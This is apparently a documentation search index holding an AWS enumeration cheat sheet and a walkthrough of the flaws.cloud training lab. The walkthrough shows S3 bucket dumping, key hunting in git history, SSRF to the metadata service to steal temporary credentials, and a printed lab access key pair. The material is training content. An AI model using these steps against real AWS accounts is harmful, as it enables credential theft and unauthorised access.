{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"aws/enumeration/","text":"Enumeration Tip When assessing AWS environments, it is recommended to configure separate testing profiles using aws configure . Each profile can then be selected for varied CLI commands using the --profile flag. IAM Identity and Access Management (IAM) is a web service for securely controlling access to AWS services. With IAM, you can centrally manage users, security credentials such as access keys, and permissions that control which AWS resources users and applications can access. AWS CLI - IAM Documentation Reading ARNs \"arn:aws:iam::123456789012:user/DevAdmin\" 123456789012 - use this in place of <account_id> in the next commands DevAdmin - use this in place of <username> in next commands Enumerating Users Get current IAM identity aws sts get-caller-identity --profile <profile_name> List IAM users aws iam list-users --profile <profile_name> Enumerating Roles List IAM roles aws iam list-roles --profile <profile_name> Get IAM user information aws iam get-user --profile <profile_name> List IAM user inline policies aws iam list-user-policies --user-name <username> --profile <profile_name> List IAM user attached policies aws iam list-attached-user-policies --user-name <username> --profile <profile_name> Get IAM user policy information aws iam get-user-policy --user-name <username> --policy-name <policy_arn> --profile <profile_name> Storage S3 Buckets List all user owned S3 buckets aws s3 ls --profile <profile_name> List all prefixes and objects in a S3 bucket aws s3 ls s3://<bucket_name> --profile <profile_name> Elastic Block Stores RDS Compute Elastic Compute Cloud (EC2) Elastic Container Registry (ECR) Fetch Container Credentials URI with SSRF curl -i -X GET \"http://container.target.flaws2.cloud/proxy/file:///proc/self/environ\" Get Container Credentials from ECS IMDS curl -i -X GET \"http://169.254.170.2/<version>/<uuid>\" /v2/credentials/2fdf39e7-50cf-4e11-a47a-533525342c80 Elastic Kubernetes Service (EKS) Automated Enumeration Warning For engagements requiring good Operational Security, it might be preferable to follow a manual approach. The following tools can be extremely noisy and easily caught by blue teams. https://github.com/nccgroup/ScoutSuite - Enumerate global security posture into HTML dashboard https://github.com/initstring/cloud_enum - Enumerate public S3 Buckets and Applications https://github.com/sa7mon/S3Scanner - Scan for open S3 buckets and dump the contents https://github.com/Eilonh/s3crets_scanner - Trufflehog wrapper to search for secrets in S3 buckets Scan for unprotected S3 buckets using keyword python3 cloud_enum.py -k <keyword> -l <outfile> -t <thread_counts> Scan/dump contents of open S3 buckets s3scanner --threads <thread_count> scan/dump --buckets-file <bucket_list> Search for secrets in S3 buckets Credits: Hunting After Secrets Accidentally Uploaded To Public S3 Buckets cd s3crets_scanner/ && python3 main.py -p <profile_name> -r <role_name>","title":"Enumeration"},{"location":"aws/enumeration/#enumeration","text":"Tip When assessing AWS environments, it is recommended to configure separate testing profiles using aws configure . Each profile can then be selected for varied CLI commands using the --profile flag.","title":"Enumeration"},{"location":"aws/enumeration/#iam","text":"Identity and Access Management (IAM) is a web service for securely controlling access to AWS services. With IAM, you can centrally manage users, security credentials such as access keys, and permissions that control which AWS resources users and applications can access. AWS CLI - IAM Documentation Reading ARNs \"arn:aws:iam::123456789012:user/DevAdmin\" 123456789012 - use this in place of <account_id> in the next commands DevAdmin - use this in place of <username> in next commands","title":"IAM"},{"location":"aws/enumeration/#enumerating-users","text":"","title":"Enumerating Users"},{"location":"aws/enumeration/#get-current-iam-identity","text":"aws sts get-caller-identity --profile <profile_name>","title":"Get current IAM identity"},{"location":"aws/enumeration/#list-iam-users","text":"aws iam list-users --profile <profile_name>","title":"List IAM users"},{"location":"aws/enumeration/#enumerating-roles","text":"","title":"Enumerating Roles"},{"location":"aws/enumeration/#list-iam-roles","text":"aws iam list-roles --profile <profile_name>","title":"List IAM roles"},{"location":"aws/enumeration/#get-iam-user-information","text":"aws iam get-user --profile <profile_name>","title":"Get IAM user information"},{"location":"aws/enumeration/#list-iam-user-inline-policies","text":"aws iam list-user-policies --user-name <username> --profile <profile_name>","title":"List IAM user inline policies"},{"location":"aws/enumeration/#list-iam-user-attached-policies","text":"aws iam list-attached-user-policies --user-name <username> --profile <profile_name>","title":"List IAM user attached policies"},{"location":"aws/enumeration/#get-iam-user-policy-information","text":"aws iam get-user-policy --user-name <username> --policy-name <policy_arn> --profile <profile_name>","title":"Get IAM user policy information"},{"location":"aws/enumeration/#storage","text":"","title":"Storage"},{"location":"aws/enumeration/#s3-buckets","text":"","title":"S3 Buckets"},{"location":"aws/enumeration/#list-all-user-owned-s3-buckets","text":"aws s3 ls --profile <profile_name>","title":"List all user owned S3 buckets"},{"location":"aws/enumeration/#list-all-prefixes-and-objects-in-a-s3-bucket","text":"aws s3 ls s3://<bucket_name> --profile <profile_name>","title":"List all prefixes and objects in a S3 bucket"},{"location":"aws/enumeration/#elastic-block-stores","text":"","title":"Elastic Block Stores"},{"location":"aws/enumeration/#rds","text":"","title":"RDS"},{"location":"aws/enumeration/#compute","text":"","title":"Compute"},{"location":"aws/enumeration/#elastic-compute-cloud-ec2","text":"","title":"Elastic Compute Cloud (EC2)"},{"location":"aws/enumeration/#elastic-container-registry-ecr","text":"","title":"Elastic Container Registry (ECR)"},{"location":"aws/enumeration/#fetch-container-credentials-uri-with-ssrf","text":"curl -i -X GET \"http://container.target.flaws2.cloud/proxy/file:///proc/self/environ\"","title":"Fetch Container Credentials URI with SSRF"},{"location":"aws/enumeration/#get-container-credentials-from-ecs-imds","text":"curl -i -X GET \"http://169.254.170.2/<version>/<uuid>\" /v2/credentials/2fdf39e7-50cf-4e11-a47a-533525342c80","title":"Get Container Credentials from ECS IMDS"},{"location":"aws/enumeration/#elastic-kubernetes-service-eks","text":"","title":"Elastic Kubernetes Service (EKS)"},{"location":"aws/enumeration/#automated-enumeration","text":"Warning For engagements requiring good Operational Security, it might be preferable to follow a manual approach. The following tools can be extremely noisy and easily caught by blue teams. https://github.com/nccgroup/ScoutSuite - Enumerate global security posture into HTML dashboard https://github.com/initstring/cloud_enum - Enumerate public S3 Buckets and Applications https://github.com/sa7mon/S3Scanner - Scan for open S3 buckets and dump the contents https://github.com/Eilonh/s3crets_scanner - Trufflehog wrapper to search for secrets in S3 buckets","title":"Automated Enumeration"},{"location":"aws/enumeration/#scan-for-unprotected-s3-buckets-using-keyword","text":"python3 cloud_enum.py -k <keyword> -l <outfile> -t <thread_counts>","title":"Scan for unprotected S3 buckets using keyword"},{"location":"aws/enumeration/#scandump-contents-of-open-s3-buckets","text":"s3scanner --threads <thread_count> scan/dump --buckets-file <bucket_list>","title":"Scan/dump contents of open S3 buckets"},{"location":"aws/enumeration/#search-for-secrets-in-s3-buckets","text":"Credits: Hunting After Secrets Accidentally Uploaded To Public S3 Buckets cd s3crets_scanner/ && python3 main.py -p <profile_name> -r <role_name>","title":"Search for secrets in S3 buckets"},{"location":"aws/training_labs/flaws/","text":"Flaws I Link to Challenge: flaws.cloud Credits: @0xdabbad00 Level 1 - Enumerating public S3 buckets (Unauthenticated) Objective This level is buckets of fun. See if you can find the first sub-domain. Our first task is to perform some enumeration round the domain itself: fog@cloudbreach:~/flaws/level6$ dig flaws.cloud A +noall +answer flaws.cloud. 5 IN A 52.92.180.235 flaws.cloud. 5 IN A 52.92.211.59 flaws.cloud. 5 IN A 52.92.212.59 flaws.cloud. 5 IN A 52.218.137.66 flaws.cloud. 5 IN A 52.218.177.90 flaws.cloud. 5 IN A 52.218.183.171 flaws.cloud. 5 IN A 52.218.224.91 flaws.cloud. 5 IN A 52.218.230.2 fog@cloudbreach:~/flaws/level6$ nslookup 52.92.180.235 235.180.92.52.in-addr.arpa name = s3-website-us-west-2.amazonaws.com. With this, we can infer that flaws.cloud is a static website hosted from a S3 bucket and that it is hosted on the us-west-2 region. fog@cloudbreach:~/flaws/level1$ aws s3 ls s3://flaws.cloud --region us-west-2 2017-03-13 23:00:38 2575 hint1.html 2017-03-02 23:05:17 1707 hint2.html 2017-03-02 23:05:11 1101 hint3.html 2020-05-22 14:16:45 3162 index.html 2018-07-10 12:47:16 15979 logo.png 2017-02-26 20:59:28 46 robots.txt 2017-02-26 20:59:30 1051 secret-dd02c7c.html An alternative way (automated) to look for **any** open S3 bucket using the cloud_enum tool would look like this: python3 cloud_enum.py -k flaws.cloud -t 10 --disable-azure --disable-gcp -l cloud_enum_output.txt ++++++++++++++++++++++++++ amazon checks ++++++++++++++++++++++++++ [+] Checking for S3 buckets OPEN S3 BUCKET: http://flaws.cloud.s3.amazonaws.com/ FILES: ->http://flaws.cloud.s3.amazonaws.com/flaws.cloud ->http://flaws.cloud.s3.amazonaws.com/hint1.html ->http://flaws.cloud.s3.amazonaws.com/hint2.html ->http://flaws.cloud.s3.amazonaws.com/hint3.html ->http://flaws.cloud.s3.amazonaws.com/index.html ->http://flaws.cloud.s3.amazonaws.com/logo.png ->http://flaws.cloud.s3.amazonaws.com/robots.txt ->http://flaws.cloud.s3.amazonaws.com/secret-dd02c7c.html Elapsed time: 00:02:56 The scanner tells us there is an unprotected open S3 bucket pointing over at flaws.cloud.s3.amazonaws.com We can list and dump its content using another tool called s3scanner (not necessary, just for example's sake): s3scanner --threads 10 dump --dump-dir . --bucket flaws.cloud.s3.amazonaws.com fog@cloudbreach:~/flaws/level1$ ll flaws.cloud.s3.amazonaws.com/ total 48 drwxrwxr-x 2 fog fog 4096 Dec 12 23:05 ./ drwxrwxr-x 3 fog fog 4096 Dec 12 23:05 ../ -rw-rw-r-- 1 fog fog 2575 Dec 12 22:52 hint1.html -rw-rw-r-- 1 fog fog 1707 Dec 12 22:52 hint2.html -rw-rw-r-- 1 fog fog 1101 Dec 12 22:52 hint3.html -rw-rw-r-- 1 fog fog 3162 Dec 12 22:52 index.html -rw-rw-r-- 1 fog fog 15979 Dec 12 22:52 logo.png -rw-rw-r-- 1 fog fog 46 Dec 12 22:52 robots.txt -rw-rw-r-- 1 fog fog 1051 Dec 12 22:52 secret-dd02c7c.html The flag for the next level can be accessed by visiting secret-dd02c7c.html . Level 2 - Enumerating public S3 buckets (AWS users) Objective The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this. You just need the free tier. This time we will use aws cli to solve the challenge. The only difference with the previous level is that we will need valid AWS access keys to be able to list and download the contents of the S3 bucket. Profiles can be added to your local machine using aws configure . fog@cloudbreach:~/flaws/level2$ aws s3 ls level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --profile=<aws_profile> 2017-02-26 21:02:15 80751 everyone.png 2017-03-02 22:47:17 1433 hint1.html 2017-02-26 21:04:39 1035 hint2.html 2017-02-26 21:02:14 2786 index.html 2017-02-26 21:02:14 26 robots.txt 2017-02-26 21:02:15 1051 secret-e4443fc.html From there we can try to download the contents of the bucket using aws s3 sync : fog@cloudbreach:~/flaws/level2$ aws s3 sync s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud . --profile=<aws_profile> Level 3 - Hunting Keys in .Git Repository fog@cloudbreach:~/flaws/level3$ git log master commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (master) Author: 0xdabbad00 <scott@summitroute.com> Date: Sun Sep 17 09:10:43 2017 -0600 Oops, accidentally added something I shouldn't have commit f52ec03b227ea6094b04e43f475fb0126edb5a61 (HEAD) Author: 0xdabbad00 <scott@summitroute.com> Date: Sun Sep 17 09:10:07 2017 -0600 first commit Sometimes, developpers mess up by committing sensitive information like passwords or API keys . While they might rectify their mistake right away, all previous versions of the repository are stored in .git/ and identified with a commit hash . To find out what scott@summitroute.com committed to the repository, we just need to use the git checkout command. fog@cloudbreach:~/flaws/level3$ git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61 M index.html Note: switching to 'f52ec03b227ea6094b04e43f475fb0126edb5a61'. fog@cloudbreach:~/flaws/level3$ ll total 168 drwxrwxr-x 3 fog fog 4096 Dec 13 01:16 ./ drwxrwxr-x 6 fog fog 4096 Dec 13 00:51 ../ -rw-rw-r-- 1 fog fog 91 Dec 13 01:16 access_keys.txt <-- !!! drwxrwxr-x 7 fog fog 4096 Dec 13 01:16 .git/ -rw-rw-r-- 1 fog fog 1552 Dec 8 02:44 hint1.html -rw-rw-r-- 1 fog fog 1426 Dec 8 02:44 hint2.html -rw-rw-r-- 1 fog fog 1247 Dec 8 02:44 hint3.html -rw-rw-r-- 1 fog fog 1035 Dec 8 02:44 hint4.html -rw-rw-r-- 1 fog fog 1861 Dec 8 02:44 index.html -rw-rw-r-- 1 fog fog 26 Dec 8 02:44 robots.txt Of course, in this example we are playing with a very scarce .git/ repo. In practice, we could leverage tools like trufflehog to help us find interesting data (also see ) fog@cloudbreach:~/flaws/level3$ cat trufflehog_output.txt trufflehog dev Found verified result \ud83d\udc37\ud83d\udd11 Detector Type: AWS Decoder Type: PLAIN Raw result: AKIAJ366LIPB4IJKT7SA Commit: f52ec03b227ea6094b04e43f475fb0126edb5a61 File: access_keys.txt Email: 0xdabbad00 <scott@summitroute.com> Timestamp: 2017-09-17 09:10:07 -0600 -0600 Line: 1 Now that we got our hands on a set of AWS Access Keys we can import them in our environment using aws configure and see what can be done with them. fog@cloudbreach:~/flaws/level3$ aws configure list --profile level3 Name Value Type Location ---- ----- ---- -------- profile level3 manual --profile access_key ****************T7SA shared-credentials-file secret_key ****************3Jys shared-credentials-file region us-west-2 config-file ~/.aws/config One of the first commands to run when looting AWS keys is get-caller-identity (AWS's version of whoami ). fog@cloudbreach:~/flaws/level3$ aws sts get-caller-identity --profile level3 { \"UserId\": \"AIDAJQ3H5DC3LEG2BKSLC\", \"Account\": \"975426262029\", \"Arn\": \"arn:aws:iam::975426262029:user/backup\" } Our user is called backup . We can leverage the policies attached to this account to list down all buckets visible by this user. fog@cloudbreach:~/flaws/level3$ aws s3 ls --profile=level3 2020-06-25 13:43:56 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud 2020-06-26 19:06:07 config-bucket-975426262029 2020-06-27 06:46:15 flaws-logs 2020-06-27 06:46:15 flaws.cloud 2020-06-27 11:27:14 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud 2020-06-27 11:27:14 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud 2020-06-27 11:27:14 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud 2020-06-27 11:27:15 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud 2020-06-27 11:27:15 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud 2020-06-27 22:29:47 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud We don't have read access to everything, but enough to move on to the next level level4-1156739cfb264ced6de514971a4bef68.flaws.cloud . Tip Read the following from Github Docs: Removing sensitive data from a repository NB: always rotate your keys/secrets if you suspect any potential leak. Level 4 - Enumerating EC2 Instance For the next level, you need to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud. It'll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it. Level 5 - SSRF on AWS Metadata Service Objective This EC2 has a simple HTTP only proxy on it. Here are some examples of it's usage: http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/ http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/ See if you can use this proxy to figure out how to list the contents of the level6 bucket at level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud that has a hidden directory in it. By leveraging the proxy on the target EC2, we are able to force the server to issue a request to host under our control. This is more-or-less equivalent to a server-side-request-forgery (SSRF) attack. SSRFs are known to be particularly impactful in cloud environments due to the presence of the internal metadata service (IMDS) running by default on every compute instance (AWS, GCP, Azure, etc.). This service is generally accessible at a fixed IP address 169.254.169.254 , let's verify that: fog@cloudbreach:~/flaws/level5$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/hostname ip-172-31-41-84.us-west-2.compute.internal Most importantly, the IMDS service sometimes allows access to sensitive access keys. fog@cloudbreach:~/flaws/level5$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws { \"Code\" : \"Success\", \"LastUpdated\" : \"2022-12-13T07:20:49Z\", \"Type\" : \"AWS-HMAC\", \"AccessKeyId\" : \"ASIA**************XQ\", \"SecretAccessKey\" : \"gH5H********************************rjmy\", \"Token\" : \"IQotuGdtSdxNiGtGsfPrY\", \"Expiration\" : \"2022-12-13T13:22:40Z\" } We just need to create another profile and import the stolen keys in our environment to see if can do anything with them. Warning Temporary (AWS STS) access key IDs - as denoted by the ASIA prefix in the AccessKeyId field - require to add an extra field in the aws profile configuration file: # cat ~/.aws/credentials [level6] aws_access_key_id = <AccessKeyId> aws_secret_access_key = <SecretAccessKey> aws_session_token = <Token> fog@cloudbreach:~/flaws/level6$ aws s3 sync s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ . --profile level6 fog@cloudbreach:~/flaws/level6$ ll total 16 drwxrwxr-x 3 fog fog 4096 Dec 8 22:10 ./ drwxrwxr-x 8 fog fog 4096 Dec 13 03:18 ../ drwxrwxr-x 2 fog fog 4096 Dec 8 22:10 ddcc78ff/ -rw-rw-r-- 1 fog fog 871 Feb 26 2017 index.html Level 6 - Exploiting AWS Lambda Functions Objective For this final challenge, you're getting a user access key that has the SecurityAudit policy attached to it. See what else it can do and what else you might find in this AWS account. Access key ID: AKIAJFQ6E7BY57Q3OBGA Secret: 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 Let's enumerate information about our current user. First question we ask ourselves is whether we have any kind of inline policies associated to us: fog@cloudbreach:~/flaws/level6$ aws iam list-user-policies --user-name Level6 --profile level6 { \"PolicyNames\": [] } What about attached policies? fog@cloudbreach:~/flaws/level6$ aws iam list-attached-user-policies --user-name Level6 --profile level6 { \"AttachedPolicies\": [ { \"PolicyName\": \"MySecurityAudit\", \"PolicyArn\": \"arn:aws:iam::975426262029:policy/MySecurityAudit\" }, { \"PolicyName\": \"list_apigateways\", \"PolicyArn\": \"arn:aws:iam::975426262029:policy/list_apigateways\" } ] } As suggested by the level description, we do have an attached policy called MySecurityAudit but also list_apigateways . What can we do with those? Tip To retrieve a managed policy document that is attached to a user, use GetPolicy to determine the policy's default version. Then use GetPolicyVersion to retrieve the policy document. aws iam get_policy --policy-arn <policy_arn> aws iam get_policy_version --policy-arn <policy_arn> --policy-id <policy_version> https://docs.aws.amazon.com/cli/latest/reference/iam/get-user-policy.html#description fog@cloudbreach:~/flaws/level6$ aws iam get-policy --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --profile level6 { \"Policy\": { \"PolicyName\": \"list_apigateways\", \"PolicyId\": \"ANPAIRLWTQMGKCSPGTAIO\", \"Arn\": \"arn:aws:iam::975426262029:policy/list_apigateways\", \"Path\": \"/\", \"DefaultVersionId\": \"v4\", \"AttachmentCount\": 1, \"PermissionsBoundaryUsageCount\": 0, \"IsAttachable\": true, \"Description\": \"List apigateways\", \"CreateDate\": \"2017-02-20T01:45:17Z\", \"UpdateDate\": \"2017-02-20T01:48:17Z\", \"Tags\": [] } } fog@cloudbreach:~/flaws/level6$ aws iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4 --profile level6 { \"PolicyVersion\": { \"Document\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Action\": [ \"apigateway:GET\" ], \"Effect\": \"Allow\", \"Resource\": \"arn:aws:apigateway:us-west-2::/restapis/*\" } ] }, \"VersionId\": \"v4\", \"IsDefaultVersion\": true, \"CreateDate\": \"2017-02-20T01:48:17Z\" } } Tip Lambda functions are called using a combination of: rest-api-id -> e.g: s33ppypa75 stage-name -> e.g: Prod region -> e.g: us-west-2 and resource -> e.g: level6 Functions call be triggered by visiting URLs formed as: https://<rest-api-id>.execute-api.<region>.amazonaws.com/<stage-name>/<resource> fog@cloudbreach:~/flaws/level6$ aws lambda get-policy --function-name Level6 --profile flaws-level6 --region us-west-2 { \"Policy\": \"{\\\"Version\\\":\\\"2012-10-17\\\",\\\"Id\\\":\\\"default\\\",\\\"Statement\\\":[{\\\"Sid\\\":\\\"904610a93f593b76ad66ed6ed82c0a8b\\\",\\\"Effect\\\":\\\"Allow\\\",\\\"Principal\\\":{\\\"Service\\\":\\\"apigateway.amazonaws.com\\\"},\\\"Action\\\":\\\"lambda:InvokeFunction\\\",\\\"Resource\\\":\\\"arn:aws:lambda:us-west-2:975426262029:function:Level6\\\",\\\"Condition\\\":{\\\"ArnLike\\\":{\\\"AWS:SourceArn\\\":\\\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\\\"}}}]}\", \"RevisionId\": \"98033dfd-defa-41a8-b820-1f20add9c77b\" } fog@cloudbreach:~/flaws/level6$ aws apigateway get-stages --rest-api-id s33ppypa75 --profile level6 --region us-west-2 { \"item\": [ { \"deploymentId\": \"8gppiv\", \"stageName\": \"Prod\", \"cacheClusterEnabled\": false, \"cacheClusterStatus\": \"NOT_AVAILABLE\", \"methodSettings\": {}, \"tracingEnabled\": false, \"createdDate\": 1488155168, \"lastUpdatedDate\": 1488155168 } ] } https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6","title":"Flaws I"},{"location":"aws/training_labs/flaws/#flaws-i","text":"Link to Challenge: flaws.cloud Credits: @0xdabbad00","title":"Flaws I"},{"location":"aws/training_labs/flaws/#level-1-enumerating-public-s3-buckets-unauthenticated","text":"Objective This level is buckets of fun. See if you can find the first sub-domain. Our first task is to perform some enumeration round the domain itself: fog@cloudbreach:~/flaws/level6$ dig flaws.cloud A +noall +answer flaws.cloud. 5 IN A 52.92.180.235 flaws.cloud. 5 IN A 52.92.211.59 flaws.cloud. 5 IN A 52.92.212.59 flaws.cloud. 5 IN A 52.218.137.66 flaws.cloud. 5 IN A 52.218.177.90 flaws.cloud. 5 IN A 52.218.183.171 flaws.cloud. 5 IN A 52.218.224.91 flaws.cloud. 5 IN A 52.218.230.2 fog@cloudbreach:~/flaws/level6$ nslookup 52.92.180.235 235.180.92.52.in-addr.arpa name = s3-website-us-west-2.amazonaws.com. With this, we can infer that flaws.cloud is a static website hosted from a S3 bucket and that it is hosted on the us-west-2 region. fog@cloudbreach:~/flaws/level1$ aws s3 ls s3://flaws.cloud --region us-west-2 2017-03-13 23:00:38 2575 hint1.html 2017-03-02 23:05:17 1707 hint2.html 2017-03-02 23:05:11 1101 hint3.html 2020-05-22 14:16:45 3162 index.html 2018-07-10 12:47:16 15979 logo.png 2017-02-26 20:59:28 46 robots.txt 2017-02-26 20:59:30 1051 secret-dd02c7c.html An alternative way (automated) to look for **any** open S3 bucket using the cloud_enum tool would look like this: python3 cloud_enum.py -k flaws.cloud -t 10 --disable-azure --disable-gcp -l cloud_enum_output.txt ++++++++++++++++++++++++++ amazon checks ++++++++++++++++++++++++++ [+] Checking for S3 buckets OPEN S3 BUCKET: http://flaws.cloud.s3.amazonaws.com/ FILES: ->http://flaws.cloud.s3.amazonaws.com/flaws.cloud ->http://flaws.cloud.s3.amazonaws.com/hint1.html ->http://flaws.cloud.s3.amazonaws.com/hint2.html ->http://flaws.cloud.s3.amazonaws.com/hint3.html ->http://flaws.cloud.s3.amazonaws.com/index.html ->http://flaws.cloud.s3.amazonaws.com/logo.png ->http://flaws.cloud.s3.amazonaws.com/robots.txt ->http://flaws.cloud.s3.amazonaws.com/secret-dd02c7c.html Elapsed time: 00:02:56 The scanner tells us there is an unprotected open S3 bucket pointing over at flaws.cloud.s3.amazonaws.com We can list and dump its content using another tool called s3scanner (not necessary, just for example's sake): s3scanner --threads 10 dump --dump-dir . --bucket flaws.cloud.s3.amazonaws.com fog@cloudbreach:~/flaws/level1$ ll flaws.cloud.s3.amazonaws.com/ total 48 drwxrwxr-x 2 fog fog 4096 Dec 12 23:05 ./ drwxrwxr-x 3 fog fog 4096 Dec 12 23:05 ../ -rw-rw-r-- 1 fog fog 2575 Dec 12 22:52 hint1.html -rw-rw-r-- 1 fog fog 1707 Dec 12 22:52 hint2.html -rw-rw-r-- 1 fog fog 1101 Dec 12 22:52 hint3.html -rw-rw-r-- 1 fog fog 3162 Dec 12 22:52 index.html -rw-rw-r-- 1 fog fog 15979 Dec 12 22:52 logo.png -rw-rw-r-- 1 fog fog 46 Dec 12 22:52 robots.txt -rw-rw-r-- 1 fog fog 1051 Dec 12 22:52 secret-dd02c7c.html The flag for the next level can be accessed by visiting secret-dd02c7c.html .","title":"Level 1 - Enumerating public S3 buckets (Unauthenticated)"},{"location":"aws/training_labs/flaws/#level-2-enumerating-public-s3-buckets-aws-users","text":"Objective The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this. You just need the free tier. This time we will use aws cli to solve the challenge. The only difference with the previous level is that we will need valid AWS access keys to be able to list and download the contents of the S3 bucket. Profiles can be added to your local machine using aws configure . fog@cloudbreach:~/flaws/level2$ aws s3 ls level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --profile=<aws_profile> 2017-02-26 21:02:15 80751 everyone.png 2017-03-02 22:47:17 1433 hint1.html 2017-02-26 21:04:39 1035 hint2.html 2017-02-26 21:02:14 2786 index.html 2017-02-26 21:02:14 26 robots.txt 2017-02-26 21:02:15 1051 secret-e4443fc.html From there we can try to download the contents of the bucket using aws s3 sync : fog@cloudbreach:~/flaws/level2$ aws s3 sync s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud . --profile=<aws_profile>","title":"Level 2 - Enumerating public S3 buckets (AWS users)"},{"location":"aws/training_labs/flaws/#level-3-hunting-keys-in-git-repository","text":"fog@cloudbreach:~/flaws/level3$ git log master commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (master) Author: 0xdabbad00 <scott@summitroute.com> Date: Sun Sep 17 09:10:43 2017 -0600 Oops, accidentally added something I shouldn't have commit f52ec03b227ea6094b04e43f475fb0126edb5a61 (HEAD) Author: 0xdabbad00 <scott@summitroute.com> Date: Sun Sep 17 09:10:07 2017 -0600 first commit Sometimes, developpers mess up by committing sensitive information like passwords or API keys . While they might rectify their mistake right away, all previous versions of the repository are stored in .git/ and identified with a commit hash . To find out what scott@summitroute.com committed to the repository, we just need to use the git checkout command. fog@cloudbreach:~/flaws/level3$ git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61 M index.html Note: switching to 'f52ec03b227ea6094b04e43f475fb0126edb5a61'. fog@cloudbreach:~/flaws/level3$ ll total 168 drwxrwxr-x 3 fog fog 4096 Dec 13 01:16 ./ drwxrwxr-x 6 fog fog 4096 Dec 13 00:51 ../ -rw-rw-r-- 1 fog fog 91 Dec 13 01:16 access_keys.txt <-- !!! drwxrwxr-x 7 fog fog 4096 Dec 13 01:16 .git/ -rw-rw-r-- 1 fog fog 1552 Dec 8 02:44 hint1.html -rw-rw-r-- 1 fog fog 1426 Dec 8 02:44 hint2.html -rw-rw-r-- 1 fog fog 1247 Dec 8 02:44 hint3.html -rw-rw-r-- 1 fog fog 1035 Dec 8 02:44 hint4.html -rw-rw-r-- 1 fog fog 1861 Dec 8 02:44 index.html -rw-rw-r-- 1 fog fog 26 Dec 8 02:44 robots.txt Of course, in this example we are playing with a very scarce .git/ repo. In practice, we could leverage tools like trufflehog to help us find interesting data (also see ) fog@cloudbreach:~/flaws/level3$ cat trufflehog_output.txt trufflehog dev Found verified result \ud83d\udc37\ud83d\udd11 Detector Type: AWS Decoder Type: PLAIN Raw result: AKIAJ366LIPB4IJKT7SA Commit: f52ec03b227ea6094b04e43f475fb0126edb5a61 File: access_keys.txt Email: 0xdabbad00 <scott@summitroute.com> Timestamp: 2017-09-17 09:10:07 -0600 -0600 Line: 1 Now that we got our hands on a set of AWS Access Keys we can import them in our environment using aws configure and see what can be done with them. fog@cloudbreach:~/flaws/level3$ aws configure list --profile level3 Name Value Type Location ---- ----- ---- -------- profile level3 manual --profile access_key ****************T7SA shared-credentials-file secret_key ****************3Jys shared-credentials-file region us-west-2 config-file ~/.aws/config One of the first commands to run when looting AWS keys is get-caller-identity (AWS's version of whoami ). fog@cloudbreach:~/flaws/level3$ aws sts get-caller-identity --profile level3 { \"UserId\": \"AIDAJQ3H5DC3LEG2BKSLC\", \"Account\": \"975426262029\", \"Arn\": \"arn:aws:iam::975426262029:user/backup\" } Our user is called backup . We can leverage the policies attached to this account to list down all buckets visible by this user. fog@cloudbreach:~/flaws/level3$ aws s3 ls --profile=level3 2020-06-25 13:43:56 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud 2020-06-26 19:06:07 config-bucket-975426262029 2020-06-27 06:46:15 flaws-logs 2020-06-27 06:46:15 flaws.cloud 2020-06-27 11:27:14 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud 2020-06-27 11:27:14 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud 2020-06-27 11:27:14 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud 2020-06-27 11:27:15 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud 2020-06-27 11:27:15 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud 2020-06-27 22:29:47 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud We don't have read access to everything, but enough to move on to the next level level4-1156739cfb264ced6de514971a4bef68.flaws.cloud . Tip Read the following from Github Docs: Removing sensitive data from a repository NB: always rotate your keys/secrets if you suspect any potential leak.","title":"Level 3 - Hunting Keys in .Git Repository"},{"location":"aws/training_labs/flaws/#level-4-enumerating-ec2-instance","text":"For the next level, you need to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud. It'll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it.","title":"Level 4 - Enumerating EC2 Instance"},{"location":"aws/training_labs/flaws/#level-5-ssrf-on-aws-metadata-service","text":"Objective This EC2 has a simple HTTP only proxy on it. Here are some examples of it's usage: 